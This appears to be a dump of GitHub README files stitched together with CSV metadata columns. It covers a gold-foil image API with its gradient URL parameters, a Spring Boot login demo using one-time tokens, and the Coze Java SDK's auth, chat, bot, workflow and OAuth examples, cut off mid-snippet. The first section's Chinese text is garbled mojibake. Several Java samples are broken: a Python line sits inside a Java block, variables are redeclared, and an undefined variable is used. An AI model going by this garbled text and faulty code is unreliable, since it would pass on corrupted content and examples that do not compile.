http://localhost:8080/api/gold-foil-image?text=‰ªéÂè≥Âà∞Â∑¶&gradientPos=rightToLeft

### `bottomToTop` - ‰ªé‰∏ãÂà∞‰∏ä

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `bottomToTop`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=‰ªé‰∏ãÂà∞‰∏ä&gradientPos=bottomToTop

### `rightTopToLeftBottom` - ‰ªéÂè≥‰∏äÂà∞Â∑¶‰∏ã

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `rightTopToLeftBottom`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=‰ªéÂè≥‰∏äÂà∞Â∑¶‰∏ã&gradientPos=rightTopToLeftBottom

### `rightBottomToLeftTop` - ‰ªéÂè≥‰∏ãÂà∞Â∑¶‰∏ä

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `rightBottomToLeftTop`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=‰ªéÂè≥‰∏ãÂà∞Â∑¶‰∏ä&gradientPos=rightBottomToLeftTop

### `circular` - ÂúÜÂΩ¢

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `circular`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=ÂúÜÂΩ¢Ê∏êÂèò&gradientPos=circular

### `circularRandom` - ÂúÜÂΩ¢ÈöèÊú∫

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `circularRandom`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=ÂúÜÂΩ¢ÈöèÊú∫&gradientPos=circularRandom

### `random` - ÈöèÊú∫ (Â¶ÇÊûú‰∏çÂä† gradientPos ÂèÇÊï∞ÔºåÈªòËÆ§Â∞±ÊòØËøô‰∏™ÈöèÊú∫ÁöÑ)

Ê∑ªÂä†ÂèÇÊï∞ `gradientPos` ‰∏∫ `random`Ôºå‰æãÂ¶Ç:

http://localhost:8080/api/gold-foil-image?text=ÈöèÊú∫Ê∏êÂèò&gradientPos=random

## üåü SVG ÁîüÊàê (ÂÖ∂‰ªñÂèÇÊï∞Âíå image Áõ∏Âêå,Áî®Ê≥ï‰∏ÄÊ†∑)

Â∞Ü`http://localhost:8080/api/gold-foil-image`
Êç¢Êàê`http://localhost:8080/api/gold-foil-svg`
Â∞±ÊòØËØ∑Ê±ÇÁîüÊàê svg ‰∫Ü

‰æãÂ¶Ç, ËØ∑‰ΩøÁî®‰ª•‰∏ãÊé•Âè£

http://localhost:8080/api/gold-foil-svg?text=‰Ω†Â•Ω

ËØ∑Ê±Ç‰πãÂêéÂá∫Áé∞Â¶Ç‰∏ãÈ°µÈù¢, Áõ¥Êé•Â§çÂà∂Âç≥ÂèØ

<img src=""./image/svg.png"" width=""800"" />
",3,0,3,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
ivangfr/spring-boot-user-pass-auth-one-time-token-login,main,"# spring-boot-user-pass-auth-one-time-token-login

The goal of this project is to create a [`Spring Boot`](https://docs.spring.io/spring-boot/index.html) application called `movies-app` that allows users to log in using [`Username/Password Authentication`](https://docs.spring.io/spring-security/reference/servlet/authentication/passwords/index.html) and [`One-Time Token Login`](https://docs.spring.io/spring-security/reference/servlet/authentication/onetimetoken.html).

## Proof-of-Concepts & Articles

On [ivangfr.github.io](https://ivangfr.github.io), I have compiled my Proof-of-Concepts (PoCs) and articles. You can easily search for the technology you are interested in by using the filter. Who knows, perhaps I have already implemented a PoC or written an article about what you are looking for.

## Additional Readings

- \[**Medium**\] [**Spring Boot App with Username/Password Authentication and One-Time Token Login**](https://medium.com/@ivangfr/spring-boot-app-with-username-password-authentication-and-one-time-token-login-fe3da92f0cb0)

## Applications

- ### movies-app

  A `Spring Boot` Java web application that provides a user interface for accessing movie information. During startup, an admin for the Movies App is created with the username `admin` and the password `admin`. Users must register by providing a username, password, and email. Once registered, both admin and users can log in either with their username and password or by requesting a one-time token sent to their email.

- ### MailPit

  We are using [`MailPit`](https://mailpit.axllent.org/). It's a lightweight email testing tool that captures and displays emails from your application in a web interface. It helps developers test email functionality without sending real emails.

## Prerequisites

- [`Java 21`](https://www.oracle.com/java/technologies/downloads/#java21) or higher;
- A containerization tool (e.g., [`Docker`](https://www.docker.com), [`Podman`](https://podman.io), etc.)

## Start Environment

- In a terminal, navigate to `spring-boot-user-pass-auth-one-time-token-login` root folder;
- Run the following command to start docker compose containers:
  ```
  docker compose up -d
  ```

## Running movies-app using Maven

- In a terminal, make sure you are in `spring-boot-user-pass-auth-one-time-token-login` folder;
- Run the following `Maven` command to start the application:
  ```
  ./mvnw clean spring-boot:run --projects movies-app
  ```

## Application URLs

| Application  | URL                   |
|--------------|-----------------------|
| `movies-app` | http://localhost:8080 |
| `MailPit`    | http://localhost:8025 |

## Demonstration

- ### User Registration

  ![user-registration](documentation/user-registration.gif)

- ### Username/Password Login

  ![username-password-login](documentation/username-password-login.gif)

- ### One-Time Token Login

  ![one-time-token-login](documentation/one-time-token-login.gif)

  > **Note**: If the admin or user logs out and tries to log in again using the same token, it will not work!

## Util Commands

- **Postgres**
  ```
  docker exec -it postgres psql -U postgres -d userdb
  \dt
  select * from users;
  ```

## Shutdown

- To stop `movies-app`, go to the terminal where it's running and press `Ctrl+C`;
- To stop and remove docker compose containers, network and volumes, go to a terminal and, inside `spring-boot-user-pass-auth-one-time-token-login` root folder, run the command below:
  ```
  docker compose down -v
  ```
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
coze-dev/coze-java,main,"# Coze Java API SDK

[![Maven Central Version](https://img.shields.io/maven-central/v/com.coze/coze-api)](https://central.sonatype.com/artifact/com.coze/coze-api)
[![codecov](https://codecov.io/github/coze-dev/coze-java/graph/badge.svg?token=UXitaQ0wp7)](https://codecov.io/github/coze-dev/coze-java)

## Introduction

The Coze API SDK for Java is a powerful tool designed to seamlessly integrate Coze's open APIs into your projects.

Key Features:
- Full support for Coze open APIs and authentication APIs
- Both synchronous and asynchronous SDK calls
- Optimized streaming APIs with Stream object returns  
- Optimized list APIs with Iterator Page object returns
- Simple and intuitive API design for ease of use

## Importing

### Gradle
```groovy
dependencies {
    implementation 'com.coze:coze-api:+'
}
```

### Maven
```xml
<dependency>
    <groupId>com.coze</groupId>
    <artifactId>coze-api</artifactId>
    <version>version</version>
</dependency>

```

## Usage

### Examples

| Example                       | File                                                                                                        |
|-------------------------------|-------------------------------------------------------------------------------------------------------------|
| pat auth                      | [TokenAuthExample.java](example/src/main/java/example/auth/TokenAuthExample.java)                           |
| oauth by web code             | [WebOAuthExample.java](example/src/main/java/example/auth/WebOAuthExample.java)                             |
| oauth by jwt flow             | [JWTsOauthExample.java](example/src/main/java/example/auth/JWTOAuthExample.java)                            |
| oauth by pkce flow            | [PKCEOauthExample.java](example/src/main/java/example/auth/PKCEOAuthExample.java)                           |
| oauth by device flow          | [DevicesOAuthExample.java](example/src/main/java/example/auth/DeviceOAuthExample.java)                      |
| handle auth exception         | [HandlerExceptionExample.java](example/src/main/java/example/auth/HandlerExceptionExample.java)             |
| bot create, publish and chat  | [PublishBotExample.java](example/src/main/java/example/bot/BotPublishExample.java)                          |
| get bot and bot list          | [GetBotExample.java](example/src/main/java/example/bot/BotRetrieveExample.java)                             |
| non-stream chat               | [ChatExample.java](example/src/main/java/example/chat/ChatExample.java)                                     |
| steam chat                    | [StreamChatExample.java](example/src/main/java/example/chat/StreamChatExample.java)                         |
| chat with local plugin        | [SubmitToolOutputExample.java](example/src/main/java/example/chat/SubmitToolOutputExample.java)             |
| chat with image               | [ChatWithImageExample.java](example/src/main/java/example/chat/ChatWithImageExample.java)                   |
| non-stream workflow chat      | [RunWorkflowExample.java](example/src/main/java/example/workflow/RunWorkflowExample.java)                   |
| stream workflow chat          | [StreamWorkflowExample.java](example/src/main/java/example/workflow/StreamWorkflowExample.java)             |
| stream workflow chat with rx  | [StreamWorkflowChatExample.java](example/src/main/java/example/workflow/StreamWorkflowChatExample.java)    |
| async workflow run            | [AsyncRunWorkflowExample.java](example/src/main/java/example/workflow/AsyncRunWorkflowExample.java)         |
| conversation                  | [CreateConversationExample.java](example/src/main/java/example/conversation/ConversationCreateExample.java) |
| list conversation             | [ListConversationsExample.java](example/src/main/java/example/conversation/ConversationsListExample.java)   |
| workspace                     | [ListWorkspaceExample.java](example/src/main/java/example/workspace/WorkspaceListExample.java)              |
| create update delete message  | [ListWorkspaceExample.java](example/src/main/java/example/conversation/message/MessageCrudExample.java)     |
| list message                  | [ListWorkspaceExample.java](example/src/main/java/example/conversation/message/MessageListExample.java)     |
| create update delete document | [DocumentCrudExample.java](example/src/main/java/example/datasets/document/DocumentCrudExample.java)        |
| list document                 | [DocumentListExample.java](example/src/main/java/example/datasets/document/DocumentListExample.java)        |
| create update delete dataset  | [DatasetCrudExample.java](example/src/main/java/example/datasets/DatasetCrudExample.java)                   |
| list dataset                  | [DatasetListExample.java](example/src/main/java/example/datasets/DatasetListExample.java)                   |
| update image caption          | [ImageCrudExample.java](example/src/main/java/example/datasets/image/ImageCrudExample.java)                 |
| list image                    | [ImageListExample.java](example/src/main/java/example/datasets/image/ImageListExample.java)                 |
| duplicate template           | [TemplateDuplicateExample.java](example/src/main/java/example/template/TemplateDuplicateExample.java)      |
| initial client                | [InitServiceExample.java](example/src/main/java/example/service/InitClientExample.java)                     |
| how to handle exception       | [HandlerExceptionExample.java](example/src/main/java/example/service/HandlerExceptionExample.java)          |
| get request log id            | [GetLogExample.java](example/src/main/java/example/service/GetLogExample.java)                              |
| set timeout                   | [SetRequestTimeoutExample.java](example/src/main/java/example/service/SetRequestTimeoutExample.java)        |

### Initialize the Coze Client 

To get started, visit https://www.coze.com/open/oauth/pats (or https://www.coze.cn/open/oauth/pats for the CN environment).

Create a new token by clicking ""Add Token"". Configure the token name, expiration time, and required permissions. Click OK to generate your personal access token.

Important: Store your personal access token securely to prevent unauthorized access.

```java
public void example() {
    // Get an access_token through personal access token or oauth.
    String token = System.getenv(""COZE_API_TOKEN"");
    TokenAuth authCli = new TokenAuth(token);
    /*
     * The default access is api.coze.com, but if you need to access api.coze.cn
     * please use baseUrl to configure the API endpoint to access
     */
    String baseUrl = System.getenv(""COZE_API_BASE"");
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(baseUrl)
            .auth(authCli)
            .client(new OkHttpClient.Builder().build()) 
            .build();
}
```

### Chat

First, create a bot instance in Coze. The bot ID is the last number in the web link URL.

#### Non-Stream Chat

The SDK provides a convenient wrapper function for non-streaming chat operations. It handles polling and message retrieval automatically. Use createAndPoll to simplify the process:

```java
public void example() throws Exception {
    String token = System.getenv(""COZE_API_TOKEN"");
    String botID = System.getenv(""PUBLISHED_BOT_ID"");
    String uid = System.getenv(""USER_ID"");
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(System.getenv(""COZE_API_BASE""))
            .auth(new TokenAuth(token))
            .readTimeout(10000)
            .build();
    ChatReq req = ChatReq.builder()
                         .botID(botID)
                         .userID(uid)
                         .messages(Collections.singletonList(Message.buildUserQuestionText(""What can you do?"")))
                         .build();
    ChatPoll chat = coze.chat().createAndPoll(req);
    for (Message message : chat.messages) {
        System.out.println(message.content);
    }
    if (chat.chat.status == ChatStatus.COMPLETED) {
        System.out.println(""token usage:"" + chat.chat.usage.tokenCount);
    }
}

```


#### Stream Chat 

Use coze.chat.stream() to create a streaming chat session. This returns a Chat Iterator that you can use to process chat events as they arrive:

```java

public void example() {
    String token = System.getenv(""COZE_API_TOKEN"");
    String botID = System.getenv(""PUBLISHED_BOT_ID"");
    String userID = System.getenv(""USER_ID"");
    TokenAuth authCli = new TokenAuth(token);
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(System.getenv(""COZE_API_BASE""))
            .auth(authCli)
            .build();
    ChatReq req = ChatReq.builder()
            .botID(botID)
            .userID(userID)
            .messages(Collections.singletonList(Message.buildUserQuestionText(""What can you do?"")))
            .build();
    Flowable<ChatEvent> resp = coze.chat().stream(req);
    resp.blockingForEach(event -> {
        if (ChatEventType.CONVERSATION_MESSAGE_DELTA.equals(event.getEvent())) {
            System.out.print(event.getMessage().getContent());
        }
        if (ChatEventType.CONVERSATION_CHAT_COMPLETED.equals(event.getEvent())) {
            System.out.println(""Token usage:"" + event.getChat().getUsage().getTokenCount());
        }
    });
}

```

### Bots

The SDK enables you to programmatically create, update, publish and list bots:

```java
public void example() {
    // Get an access_token through personal access token or oauth.
    String token = System.getenv(""COZE_API_TOKEN"");
    TokenAuth authCli = new TokenAuth(token);
    // Init the Coze client through the access_token.
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(System.getenv(""COZE_API_BASE""))
            .auth(authCli)
            .build();
    /*
    * step one, create a bot
    * */
    String workspaceID = System.getenv(""WORKSPACE_ID"");
    // set the prompt of your bot
    BotPromptInfo promptInfo = new BotPromptInfo(""your prompt"");
    // set the onboarding info of your bot
    BotOnboardingInfo onboardingInfo = BotOnboardingInfo.builder()
            .prologue(""the prologue of your bot"")
            .suggestedQuestions(Arrays.asList(""question 1"", ""question 2""))
            .build();
    // Call the upload file interface to get the avatar id.
    String avatarPath = ""/path/avatar.jpg"";
    FileInfo avatarInfo = coze.files().upload(avatarPath);
    // build the request
    CreateBotReq createReq = CreateBotReq.builder()
            .spaceID(workspaceID)
            .description(""the description of your bot"")
            .name(""the name of your bot"")
            .promptInfo(promptInfo)
            .onboardingInfo(onboardingInfo)
            .iconFileID(avatarInfo.getID())
            .build();
    // Invoke the creation interface to create a bot in the draft status, and you can get the bot id.
    String botID = coze.bots().create(createReq).getBotID();
    /*
     * step two, update the bot, you can update the bot after being created
     * in this example, we will update the avatar of the bot
     */
    // Call the publishing interface to publish the bot on the api channel.
    PublishBotResult updateResp = coze.bots().publish(PublishBotReq.of(botID));
    /*
     * step three, you can also modify the bot configuration and republish it.
     * in this example, we will update the avatar of the bot
     */
    // set the onboarding info of your bot
    // Call the upload file interface to get the avatar id.
    String newAvatarPath = ""/path/new_avatar.jpg"";
    FileInfo newAvatarInfo = coze.files().upload(newAvatarPath);
    // build the request
    UpdateBotReq updateReq = UpdateBotReq.builder()
            .botID(botID)
            .iconFileID(newAvatarInfo.getID())
            .build();
    // Invoke the update interface to update a bot, It means success that no exception has been thrown.
    coze.bots().update(updateReq);
    updateResp = coze.bots().publish(PublishBotReq.of(botID));
}

```

### Conversations 

The SDK provides comprehensive conversation management capabilities, including:
- Creating new conversations
- Conducting chat sessions
- Retrieving message history
- Managing conversation state

```java

public void example() {
    // Get an access_token through personal access token or oauth.
    String token = System.getenv(""COZE_API_TOKEN"");
    TokenAuth authCli = new TokenAuth(token);
    // Init the Coze client through the access_token.
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(System.getenv(""COZE_API_BASE""))
            .auth(authCli)
            .readTimeout(10000)
            .build();
    // create conversation
    Conversation resp = coze.conversations().create(new CreateConversationReq());
    System.out.println(""create conversations"" + resp);
    // retrieve conversation
    String conversationID = resp.getId();
    Conversation getResp = coze.conversations().retrieve(RetrieveConversationReq.of(conversationID));
    System.out.println(""retrieve conversations:"" + getResp);
    // append message to conversation
    Message msgs = coze.conversations().messages().create(CreateMessageReq
            .builder()
            .conversationID(conversationID)
            // if you want to create object content, you can use followed method to simplify your code
            .objectContent(
                    Arrays.asList(MessageObjectString.buildText(""hello""),
                            MessageObjectString.buildImageByURL(System.getenv(""PICTURE_URL"")),
                            MessageObjectString.buildFileByURL(System.getenv(""FILE_URL""))))
            .build());
    System.out.println(msgs);
    /*
    * retrieve message
    * */
    Message retrievedMsg = coze.conversations().messages().retrieve(RetrieveMessageReq.builder()
            .conversationID(conversationID)
            .messageID(message.getId())
            .build());
    System.out.println(retrievedMsg);
    /*
    * update message
    * */
    UpdateMessageReq updateReq = UpdateMessageReq.builder()
            .conversationID(conversationID).messageID(message.getId())
            .content(String.format(""modified message content:%s"", message.getContent()))
            .contentType(MessageContentType.TEXT).build();
    Message resp = coze.conversations().messages().update(updateReq);
    System.out.println(resp);
    /*
    * delete message
    * */
    Message deletedMsg = coze.conversations().messages().delete(DeleteMessageReq.builder()
            .conversationID(conversationID)
            .messageID(message.getId())
            .build());
    System.out.println(deletedMsg);
    // list messages
    ListMessageReq req = ListMessageReq.builder()
            .conversationID(conversationID)
            .limit(limit)
            .build();
    PageResult<Message> messages = coze.conversations().messages().list(req);
    Iterator<Message> iter = messages.getIterator();
    iter.forEachRemaining(System.out::println);
    // clear conversation
    ClearConversationResult clearResp = coze.conversations().clear(ClearConversationReq.of(conversationID));
    System.out.println(clearResp);
}
```

### Files

The SDK supports file and image uploads. You can use uploaded files for:
- Bot avatars
- Multimodal conversations 

```java
public void example() {
    String token = System.getenv(""COZE_API_TOKEN"");
    TokenAuth authCli = new TokenAuth(token);
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(System.getenv(""COZE_API_BASE""))
            .auth(authCli)
            .readTimeout(10000)
            .build();
    String filePath = System.getenv(""FILE_PATH"");
    //*** upload file ***//
    FileInfo fileInfo = coze.files().upload(filePath);
    // you can also upload file in byte array
    FileInfo fileInfo = coze.files().upload(new byte[1024]);
    //*** retrive file ***//
    FileInfo retrievedInfo = coze.files().retrieve(fileInfo.getID());
    System.out.println(retrievedInfo);
}

```

### Workflows

Coze also enables users to directly invoke the workflow.

#### Non-stream workflow run

```java
public static void main(String[] args) {
// Get an access_token through personal access token or oauth.
    String token = System.getenv(""COZE_API_TOKEN"");
    TokenAuth authCli = new TokenAuth(token);
    // Init the Coze client through the access_token.
    CozeAPI coze = new CozeAPI.Builder()
        .baseURL(System.getenv(""COZE_API_BASE""))
        .auth(authCli)
        .readTimeout(10000)
        .build();
    String workflowID = System.getenv(""WORKSPACE_ID"");
    // if your workflow need input params, you can send them by map
    Map<String, Object> data = new HashMap<>();
    data.put(""param name"", ""param values"");
    RunWorkflowReq.RunWorkflowReqBuilder builder = RunWorkflowReq.builder();
    builder.workflowID(workflowID).parameters(data);
    RunWorkflowResp resp = coze.workflows().runs().run(builder.build());
    System.out.println(resp);
}
```

#### Stream workflow run

The returned result of the streaming interface is an iterator and can be directly iterated.

When the workflow incorporates question-and-answer nodes, the streaming interface will
return the INTERRUPT event.

Users should call the resume interface to submit the results of the question-and-answer.

The return value of resume remains an iterator, so recursive processing might be necessary here.

```java
public static void main(String[] args) {
    // Get an access_token through personal access token or oauth.
    String token = System.getenv(""COZE_API_TOKEN"");
    TokenAuth authCli = new TokenAuth(token);
    // Init the Coze client through the access_token.
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(System.getenv(""COZE_API_BASE""))
            .auth(authCli)
            .readTimeout(10000)
            .build();
    String workflowID = System.getenv(""WORKSPACE_ID"");
    // if your workflow need input params, you can send them by map
    Map<String, Object> data = new HashMap<>();
    data.put(""param name"", ""param values"");
    RunWorkflowReq.RunWorkflowReqBuilder builder = RunWorkflowReq.builder();
    builder.workflowID(workflowID).parameters(data);
    Flowable<WorkflowEvent> flowable = coze.workflows().runs().stream(builder.build());
    handleEvent(flowable, coze, workflowID);
}
```

### Dataset

```java
public static void main(String[] args) {
    // Get an access_token through personal access token or oauth.
    String token = System.getenv(""COZE_API_TOKEN"");
    TokenAuth authCli = new TokenAuth(token);
    // Init the Coze client through the access_token.
    CozeAPI coze = new CozeAPI.Builder()
            .baseURL(System.getenv(""COZE_API_BASE""))
            .auth(authCli)
            .readTimeout(10000)
            .build();
    Long datasetID = Long.parseLong(System.getenv(""DATASET_ID""));
    /*
     * create document in to specific dataset
     * */
    CreateDocumentReq createReq = CreateDocumentReq.builder()
            .datasetID(datasetID)
            .documentBases(Arrays.asList(
                    DocumentBase.buildWebPage(""web doc example"", ""https://your-website.com""), //create datasets documents by web page
                    DocumentBase.buildLocalFile(""file doc example"", ""your file content"", ""txt""))) //create datasets documents by local file
            .build();
    CreateDocumentResp creatResp = coze.datasets().documents().create(createReq);
    List<Long> documentIDs = new ArrayList<>();
    for (Document documentBase : creatResp.getDocumentInfos()) {
        documentIDs.add(Long.parseLong(documentBase.getDocumentID()));
    }
    /*
     * update document. It means success that no exception has been thrown
     * */
    UpdateDocumentReq updateReq = UpdateDocumentReq.builder()
            .documentID(documentIDs.get(0))
            .documentName(""new name"")
            .build();
    coze.datasets().documents().update(updateReq);
    /*
     * delete document. It means success that no exception has been thrown
     * */
    coze.datasets().documents().delete(DeleteDocumentReq.builder().documentIDs(Collections.singletonList(documentIDs.get(0))).build());

    /*
     * list documents
     * */
    ListDocumentReq req = ListDocumentReq.builder()
                .size(2)
                .datasetID(datasetID)
                .page(1)
                .build();

    // you can use iterator to automatically retrieve next page
    PageResult<Document> documents = coze.datasets().documents().list(req);
    Iterator<Document> iter = documents.getIterator();
    iter.forEachRemaining(System.out::println);
}
```

### OAuth App

#### Web OAuth App

To create a Web OAuth application:

1. Visit https://www.coze.com/open/oauth/apps (or https://www.coze.cn/open/oauth/apps for CN environment)
2. Create a new OAuth App of type ""Web application"" 
3. Follow the setup guide at https://www.coze.com/docs/developer_guides/oauth_code

Upon completion, you'll receive three critical parameters:
- Client ID
- Client secret (store securely)
- Redirect URI

```java
public void initOAuthClient() {
    String clientSecret = System.getenv(""COZE_WEB_OAUTH_CLIENT_SECRET"");
    String clientID = System.getenv(""COZE_WEB_OAUTH_CLIENT_ID"");
    
    String cozeAPIBase = System.getenv(""COZE_API_BASE"");
    if (cozeAPIBase == null || cozeAPIBase.isEmpty()) {
        cozeAPIBase = Consts.COZE_COM_BASE_URL;
    }
    
    WebOAuthClient oauth = new WebOAuthClient.WebOAuthBuilder()
            .clientID(clientID)
            .clientSecret(clientSecret)
            .baseURL(cozeAPIBase)
            .build();
}
```

The WebOAuth authorization process is to first generate a coze authorization link and
send it to the coze user requiring authorization.

Once the coze user opens the link, they can see the authorization consent button.

```java

public void genAuthLink() {
    String redirectURI = System.getenv(""COZE_WEB_OAUTH_REDIRECT_URI"");
    // Generate the authorization link and direct the user to open it.
    String oauthURL = oauth.getOAuthURL(redirectURI, null);
}
```

After the user clicks the authorization consent button, the coze web page will redirect
to the redirect address configured in the authorization link and carry the authorization
code and state parameters in the address via the query string.

```java
public void getAccessToken() {
    /*
    After the user clicks the authorization consent button, the Coze web page will redirect
    to the redirect address configured in the authorization link and carry the authorization
    code and state parameters in the address via the query string.
    Get from the query of the redirect interface: query.get('code')
    */
    String code = ""mock code"";

    /*
    After obtaining the code after redirection, the interface to exchange the code for a
    token can be invoked to generate the Coze access_token of the authorized user.
    */
    OAuthToken resp = oauth.getAccessToken(code, redirectURI);
    System.out.println(resp);

    // Use the access token to init Coze client
    CozeAPI coze = new CozeAPI.Builder().auth(new TokenAuth(resp.getAccessToken())).baseURL(cozeAPIBase).build();

    // When the token expires, you can also refresh and re-obtain the token
    resp = oauth.refreshToken(resp.getRefreshToken());
}
```

#### JWT OAuth App

Firstly, users need to access https://www.coze.com/open/oauth/apps. For the cn environment,
users need to access https://www.coze.cn/open/oauth/apps to create an OAuth App of the type
of Service application.

The specific creation process can be referred to in the document:
https://www.coze.com/docs/developer_guides/oauth_jwt. For the cn environment, it can be
accessed at https://www.coze.cn/docs/developer_guides/oauth_jwt.

After the creation is completed, three parameters, namely the client ID, private key,
and public key id, can be obtained. For the client secret and public key id, users need to
keep it securely to avoid leakage.

```java
public void initOAuthClient() {
    String cozeAPIBase = System.getenv(""COZE_API_BASE"");
    if (cozeAPIBase == null || cozeAPIBase.isEmpty()) {
        cozeAPIBase = ""api.coze.cn"";
    }
    String jwtOauthClientID = System.getenv(""COZE_JWT_OAUTH_CLIENT_ID"");
    String jwtOauthPrivateKey = System.getenv(""COZE_JWT_OAUTH_PRIVATE_KEY"");
    String jwtOauthPrivateKeyFilePath = System.getenv(""COZE_JWT_OAUTH_PRIVATE_KEY_FILE_PATH"");
    String jwtOauthPublicKeyID = System.getenv(""COZE_JWT_OAUTH_PUBLIC_KEY_ID"");
    JWTOAuthClient oauth = null;
    try {
        jwtOauthPrivateKey = new String(Files.readAllBytes(Paths.get(jwtOauthPrivateKeyFilePath)), StandardCharsets.UTF_8);
    } catch (IOException e) {
        e.printStackTrace();
    }
    /*
    The jwt oauth type requires using private to be able to issue a jwt token, and through
    the jwt token, apply for an access_token from the coze service. The sdk encapsulates
    this procedure, and only needs to use get_access_token to obtain the access_token under
    the jwt oauth process.
    Generate the authorization token
    The default ttl is 900s, and developers can customize the expiration time, which can be
    set up to 24 hours at most.
    */
    try {
        oauth = new JWTOAuthClient.JWTOAuthBuilder()
                .clientID(jwtOauthClientID)
                .privateKey(jwtOauthPrivateKey)
                .publicKey(jwtOauthPublicKeyID)
                .baseURL(cozeAPIBase)
                .build();
    } catch (Exception e) {
        e.printStackTrace();
        return;
    }
}
```

The jwt oauth type requires using private to be able to issue a jwt token, and through
the jwt token, apply for an access_token from the coze service.

The sdk encapsulates this procedure, and only needs to use get_access_token to obtain
the access_token under the jwt oauth process.

```java
# The jwt process does not require any other operations, you can directly apply for a token
oauth_token = jwt_oauth_app.get_access_token(ttl=3600)

public void getAccessToken() {
    // The jwt process does not require any other operations, you can directly apply for a token
    OAuthToken resp = oauth.getAccessToken(3600);

    // Use the access token to init Coze client
    CozeAPI coze = new CozeAPI.Builder().auth(new TokenAuth(resp.getAccessToken())).baseURL(cozeAPIBase).build();

}
```

#### PKCE OAuth App

PKCE stands for Proof Key for Code Exchange, and it's an extension to the OAuth 2.0 authorization
code flow designed to enhance security for public clients, such as mobile and single-page
applications.

Firstly, users need to access https://www.coze.com/open/oauth/apps. For the cn environment,
users need to access https://www.coze.cn/open/oauth/apps to create an OAuth App of the type
of Mobile/PC/Single-page application.

The specific creation process can be referred to in the document:
https://www.coze.com/docs/developer_guides/oauth_pkce. For the cn environment, it can be
accessed at https://www.coze.cn/docs/developer_guides/oauth_pkce.

After the creation is completed, three parameters, namely the client ID can be obtained.

```java
public void initOAuthClient() {
    String clientID = System.getenv(""COZE_PKCE_OAUTH_CLIENT_ID"");
    /*
     * The default access is api.coze.com, but if you need to access api.coze.cn,
     * please use base_url to configure the api endpoint to access
     */
    String cozeAPIBase = System.getenv(""COZE_API_BASE"");
    if (cozeAPIBase == null || cozeAPIBase.isEmpty()) {
        cozeAPIBase = Consts.COZE_COM_BASE_URL;
    }
    PKCEOAuthClient oauth = new PKCEOAuthClient.PKCEOAuthBuilder()
            .clientID(clientID)
            .baseURL(cozeAPIBase)
            .build();
}
```

In the pkce oauth process, first, need to select a suitable code_challenge_method.
Coze supports two types: plain and s256.

Then, based on the selected code_challenge_method type, hash the code_verifier into
the code_challenge. Finally, based on the callback address,
code_challenge, and code_challenge_method, an authorization link can be generated.

The sdk will automatically handle the code_challenge process, and return the code verifier.

```java

public void genAuthLink() {
    String redirectURI = System.getenv(""COZE_WEB_OAUTH_REDIRECT_URI"");
    PKCEAuthParam oauthURL = oauth.genOAuthURL(redirectURI, ""state"", PKCEOAuthClient.CodeChallengeMethod.S256);
    System.out.println(oauthURL);
}
```

Developers should lead users to open up this authorization link.

When the user consents to the authorization, Coze will redirect with the code to the
callback address configured by the developer, and the developer can obtain this code.

```java
public void getAccessToken() {
    /*
    Open the authorization link in your browser and authorize this OAuth App
    After authorization, you can exchange code_verifier for access token
    */
    String code = ""mock code"";
    /*
    After obtaining the code after redirection, the interface to exchange the code for a
    token can be invoked to generate the Coze access_token of the authorized user.
    */
    OAuthToken resp = oauth.getAccessToken(code, redirectURI, """");
    System.out.println(resp);
    // Use the access token to init Coze client
    CozeAPI coze = new CozeAPI.Builder().auth(new TokenAuth(resp.getAccessToken())).baseURL(cozeAPIBase).build();
    // When the token expires, you can also refresh and re-obtain the token
    resp = oauth.refreshToken(resp.getRefreshToken());
}
```

#### Device OAuth App

The Device Flow is designed for devices with limited input capabilities or no browser access. This OAuth 2.0 extension enables secure authorization for IoT devices, CLI tools, and other limited-input scenarios.

Firstly, users need to access https://www.coze.com/open/oauth/apps. For the cn environment,
users need to access https://www.coze.cn/open/oauth/apps to create an OAuth App of the type
of TVs/Limited Input devices/Command line programs.

The specific creation process can be referred to in the document:
https://www.coze.com/docs/developer_guides/oauth_device_code. For the cn environment, it can be
accessed at https://www.coze.cn/docs/developer_guides/oauth_device_code.

After the creation is completed, three parameters, namely the client ID can be obtained.

```java
public void initOAuthClient() {
    String clientID = System.getenv(""COZE_PKCE_OAUTH_CLIENT_ID"");
    /*
     * The default access is api.coze.com, but if you need to access api.coze.cn,
     * please use base_url to configure the api endpoint to access
     */
    String cozeAPIBase = System.getenv(""COZE_API_BASE"");
    if (cozeAPIBase == null || cozeAPIBase.isEmpty()) {
        cozeAPIBase = Consts.COZE_COM_BASE_URL;
    }
    DeviceOAuthClient oauth = new DeviceOAuthClient.DeviceOAuthBuilder()
        .clientID(clientID)
        .baseURL(cozeAPIBase)
        .build();
}
```

In the device oauth authorization process, developers need to first call the interface
of Coze to generate the device code to obtain the user_code and device_code.

Then generate the authorization link through the user_code, guide the user to open the
link, fill in the user_code, and consent to the authorization.

Developers need to call the interface of Coze to generate the token through the device_code.

When the user has not authorized or rejected the authorization, the interface will throw an
error and return a specific error code.

After the user consents to the authorization, the interface will succeed and return the
access_token.

```java
// First, you need to request the server to obtain the device code required in the device auth flow
DeviceAuthCode codeResp = oauth.getDeviceCode();

// The returned device_code contains an authorization link. Developers need to guide users
// to open up this link.
// open device_code.verification_url
```

The developers then need to use the device_code to poll Coze's interface to obtain the token.

The SDK has encapsulated this part of the code in and handled the different returned error
codes. The developers only need to invoke get_access_token.

```java
try {
    OAuthToken resp = oauth.getAccessToken(codeResp.getDeviceCode());
    System.out.println(resp);

    // Use the access token to init Coze client
